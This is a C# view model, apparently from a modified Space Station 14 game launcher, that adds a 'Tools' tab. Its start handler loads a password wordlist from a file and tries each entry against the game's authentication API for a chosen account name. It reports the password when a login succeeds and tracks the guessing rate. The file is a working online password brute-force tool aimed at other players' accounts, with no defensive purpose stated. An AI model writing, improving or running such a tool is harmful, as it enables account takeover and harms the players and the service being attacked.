using System;
using System.IO;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows.Input;
using Avalonia.Controls;
using Avalonia.Data.Converters;
using Avalonia.Input;
using Avalonia.Media;
using DynamicData;
using Marsey;
using Marsey.Config;
using Marsey.Game.Patches;
using Marsey.Misc;
using Marsey.Stealthsey;
using Microsoft.Toolkit.Mvvm.Input;
using Serilog;
using Splat;
using SS14.Launcher.Api;
using SS14.Launcher.Marseyverse;
using SS14.Launcher.Models.ContentManagement;
using SS14.Launcher.Models.Data;
using SS14.Launcher.Models.EngineManager;
using SS14.Launcher.Models.Logins;
using SS14.Launcher.Utility;
using SS14.Launcher.ViewModels.Login;
using TerraFX.Interop.WinRT;
using static SS14.Launcher.ViewModels.Login.LoginViewModel;
using ReactiveUI;

namespace SS14.Launcher.ViewModels.MainWindowTabs;

public class ToolsTabViewModel : MainWindowTabViewModel
{
    private readonly AuthApi _authApi;
    private double _passwordsPerMinute;
    public double PasswordsPerMinute
    {
        get => _passwordsPerMinute;
        set => this.RaiseAndSetIfChanged(ref _passwordsPerMinute, value);
    }

    private string _foundPassword = "";
    public string FoundPassword
    {
        get => _foundPassword;
        set => this.RaiseAndSetIfChanged(ref _foundPassword, value);
    }

    private System.Timers.Timer? _ppsTimer;
    private int _ppsCount;
    private DateTime _ppsLastTime;

    public ToolsTabViewModel(AuthApi authApi)
    {
        _authApi = authApi ?? throw new ArgumentNullException(nameof(authApi));
        PasswordsPerMinute = 0.0;
    }

    public string CKey { get; set; } = "";
    public string Path { get; set; } = "";

    public override string Name => "Tools";

    public async void OnStartButtonPressed()
    {
        try
        {
            FoundPassword = "";
            PasswordsPerMinute = 0.0;
            StreamReader sr = new StreamReader(Path);
            var passwords = new List<string>();
            string? dict;
            while ((dict = await sr.ReadLineAsync()) != null)
                passwords.Add(dict);
            sr.Close();
            int count = 0;
            _ppsCount = 0;
            _ppsLastTime = DateTime.UtcNow;
            var startTime = DateTime.UtcNow;
            _ppsTimer?.Stop();
            _ppsTimer = new System.Timers.Timer(500);
            _ppsTimer.Elapsed += (s, e) =>
            {
                var now = DateTime.UtcNow;
                var elapsed = (now - _ppsLastTime).TotalSeconds;
                if (elapsed > 0)
                {
                    var ppm = (_ppsCount / elapsed) * 60.0;
                    PasswordsPerMinute = ppm;
                }
                _ppsCount = 0;
                _ppsLastTime = now;
            };
            _ppsTimer.AutoReset = true;
            _ppsTimer.Start();
            foreach (var pwd in passwords)
            {
                var request = new AuthApi.AuthenticateRequest(CKey, pwd);
                var respTask = _authApi.AuthenticateAsync(request);
                count++;
                _ppsCount++;
                var resp = await respTask;
                if (resp.IsSuccess)
                {
                    FoundPassword = pwd;
                    break;
                }
            }
            _ppsTimer.Stop();
            var totalElapsed = (DateTime.UtcNow - startTime).TotalSeconds;
            if (totalElapsed > 0)
                PasswordsPerMinute = (count / totalElapsed) * 60.0;
            else
                PasswordsPerMinute = 0.0;
        }
        catch (Exception e)
        {
            Log.Error(e, "Something went wrong");
        }
    }
}
